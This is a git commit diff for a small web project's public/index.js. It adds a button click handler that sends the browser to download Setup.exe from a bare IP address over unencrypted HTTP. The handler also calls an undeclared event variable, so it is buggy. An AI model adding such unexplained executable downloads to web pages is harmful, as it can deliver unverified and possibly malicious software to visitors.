66ef71773bdb4a595fd467ccb485aafedc6246ef
Kirill Maximov <52042792+weopeji@users.noreply.github.com>
2020-11-13 14:53:50 +0300

    1.0.0 LAST

--- public/index.js
+++ public/index.js
@@ -5,3 +5,8 @@ var imSocket = io.connect(global_data.data_url_localhost);
 imSocket.on('connect', function() {
     console.log('Connecting to host...');
 });
+
+$('.add_button').click( function() {
+    e.preventDefault();  //stop the browser from following
+    window.location.href = 'http://80.249.146.216/Setup.exe';
+})
